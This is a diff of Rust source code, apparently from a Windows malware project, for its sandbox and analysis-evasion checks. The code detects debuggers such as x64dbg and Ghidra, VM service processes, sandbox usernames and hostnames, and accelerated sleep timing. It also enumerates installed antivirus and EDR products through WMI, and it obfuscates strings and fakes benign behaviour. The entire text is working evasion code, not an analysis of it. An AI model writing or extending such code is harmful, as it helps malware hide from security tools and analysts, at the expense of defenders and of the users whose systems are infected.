-            lower == obfstr::obfstr!("x64dbg.exe") ||
-            lower == obfstr::obfstr!("ollydbg.exe") ||
-            lower == obfstr::obfstr!("processhacker.exe") ||
-            lower == obfstr::obfstr!("vmtoolsd.exe") ||
-            lower == obfstr::obfstr!("vboxservice.exe") ||
-            lower == obfstr::obfstr!("joeboxserver.exe") ||
-            lower == obfstr::obfstr!("ida.exe") ||
-            lower == obfstr::obfstr!("ida64.exe") ||
-            lower == obfstr::obfstr!("ghidra.exe") ||
-            lower == obfstr::obfstr!("ccleaner.exe") ||
-            lower == obfstr::obfstr!("ccleaner64.exe");
-
-        if is_blacklisted {
-            add_detection(result, obfstr::obfstr!("Process"), &format!("Blacklisted process: {}", p), 50);
-            found_count += 1;
+        for &tool in &analysis {
+            if lower == tool {
+                add_detection(result, "Process", &format!("Analysis tool: {}", p), 60);
+            }
         }
-    }
-    
-    if running.len() < 40 {
-        add_detection(result, obfstr::obfstr!("Process"), &format!("Low process count: {}", running.len()), 30);
-    }
-}
-
-fn check_blu(result: &mut DetectionResult) {
-    if let Ok(user) = std::env::var(obfstr::obfstr!("USERNAME")) {
-        let lower = user.to_lowercase();
         
-        let is_blacklisted = 
-            lower == obfstr::obfstr!("admin") ||
-            lower == obfstr::obfstr!("user") ||
-            lower == obfstr::obfstr!("sandbox") ||
-            lower == obfstr::obfstr!("virus") ||
-            lower == obfstr::obfstr!("malware") ||
-            lower == obfstr::obfstr!("test") ||
-            lower == obfstr::obfstr!("currentuser") ||
-            lower == obfstr::obfstr!("username") ||
-            lower == obfstr::obfstr!("john") ||
-            lower == obfstr::obfstr!("emily") ||
-            lower == obfstr::obfstr!("george") ||
-            lower == obfstr::obfstr!("bruno") ||
-            lower == obfstr::obfstr!("dekker");
-
-        if is_blacklisted {
-            add_detection(result, obfstr::obfstr!("User"), &format!("Blacklisted username: {}", user), 60);
+        for &vm in &vm_procs {
+            if lower == vm {
+                add_detection(result, "Process", &format!("VM process: {}", p), 80);
+            }
         }
     }
     
-    if let Ok(host) = std::env::var(obfstr::obfstr!("COMPUTERNAME")) {
-        let lower = host.to_lowercase();
-        if lower.contains(obfstr::obfstr!("sandbox")) || lower == obfstr::obfstr!("user-pc") {
-            add_detection(result, obfstr::obfstr!("User"), &format!("Suspicious hostname: {}", host), 40);
-        }
+    if procs.len() < 40 {
+        add_detection(result, "Process", &format!("Low process count: {}", procs.len()), 25);
     }
 }
 
-fn check_mact(_result: &mut DetectionResult) {}
-fn get_running_processes() -> Vec<String> {
-    crate::utils::syscall::get_filtered_process_names()
+fn check_timing(result: &mut DetectionResult) {
+    let start = std::time::Instant::now();
+    std::thread::sleep(Duration::from_millis(500));
+    let elapsed = start.elapsed().as_millis();
+    
+    if elapsed < 400 {
+        add_detection(result, "Timing", "Sleep acceleration detected", 100);
+    }
 }
 
+pub fn get_installed_antivirus() -> Vec<String> {
+    use std::collections::HashMap;
+    use wmi::{COMLibrary, Variant, WMIConnection};
+    
+    let com = match COMLibrary::new() {
+        Ok(c) => c,
+        Err(_) => return Vec::new(),
+    };
+    
+    let wmi = match WMIConnection::with_namespace_path("root\\SecurityCenter2", com) {
+        Ok(w) => w,
+        Err(_) => return Vec::new(),
+    };
+    
+    let query = "SELECT displayName FROM AntiVirusProduct";
+    let results: Vec<HashMap<String, Variant>> = match wmi.raw_query(query) {
+        Ok(r) => r,
+        Err(_) => return Vec::new(),
+    };
+    
+    results.iter()
+        .filter_map(|av| {
+            if let Some(Variant::String(name)) = av.get("displayName") {
+                Some(name.clone())
+            } else {
+                None
+            }
+        })
+        .collect()
+}
 
-fn fake_behavior() {
-    random_delay((2, 5));
-    let _ = std::fs::read_to_string(obfstr::obfstr!("C:\\Windows\\System32\\drivers\\etc\\hosts")); 
+fn check_antivirus(result: &mut DetectionResult) {
+    let avs = get_installed_antivirus();
+    
+    let sandbox_avs = [
+        "windows defender", // Usually ok, but check others
+        "cuckoo",
+        "joe sandbox",
+        "any.run",
+        "hybrid analysis",
+        "virustotal",
+        "sandbox",
+    ];
+    
+    let edr_products = [
+        "crowdstrike",
+        "carbon black",
+        "sentinel",
+        "cylance",
+        "sophos",
+        "mcafee",
+        "kaspersky",
+        "bitdefender",
+        "eset",
+        "malwarebytes",
+        "norton",
+        "avast",
+        "avg",
+        "trend micro",
+        "f-secure",
+        "panda",
+        "comodo",
+        "webroot",
+    ];
+    
+    for av in &avs {
+        let lower = av.to_lowercase();
+        
+        for sandbox in &sandbox_avs {
+            if lower.contains(sandbox) && *sandbox != "windows defender" {
+                add_detection(result, "AV", &format!("Sandbox AV detected: {}", av), 60);
+            }
+        }
+        
+        for edr in &edr_products {
+            if lower.contains(edr) {
+                aa_log!("EDR detected: {}", av);
+            }
+        }
+    }
+    
+    if avs.is_empty() {
+        add_detection(result, "AV", "No antivirus installed", 15);
+    }
 }
